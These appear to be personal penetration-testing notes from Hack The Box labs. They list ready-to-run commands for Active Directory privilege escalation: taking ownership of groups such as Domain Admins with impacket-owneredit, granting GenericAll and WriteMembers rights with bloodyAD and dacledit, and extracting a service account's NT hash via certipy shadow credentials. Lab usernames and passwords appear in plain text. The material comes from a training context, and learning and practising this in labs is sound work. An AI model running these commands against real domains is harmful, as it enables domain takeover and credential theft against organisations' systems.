
For group

```
impacket-owneredit -action write -new-owner 'ryan' -target-dn 'CN=Domain Admins,CN=Users,DC=sequel,DC=local' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.129.232.128
```

To Modify owner rights 

```
──(n0rmh3ll㉿kali)-[~/HTB/Certified]
└─$ impacket-owneredit -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.129.231.186 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

Adding generic write to self;

```
bloodyAD -u judith.mader -p 'judith09' -d certified.htb --host 10.129.231.186 add genericAll "CN=MANAGEMENT,CN=Users,DC=certified,DC=HTB" judith.mader
```

```
[+] judith.mader has now GenericAll on CN=MANAGEMENT,CN=Users,DC=certified,DC=HTB
```

Now judith.mader has GenericAll permission for all outbound of Group Management 


Or Writemember permission ( Judith can now add or remove users from the Management group )

```
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.10.11.41
```



## For another user;


Ryan has permission writeowner to ca_svc

Using BloodyAD

```
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
```

Giving generic all permission to ryan

```
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
```

Print NT hash using certipy-AD

```
certipy-ad shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.232.128
```


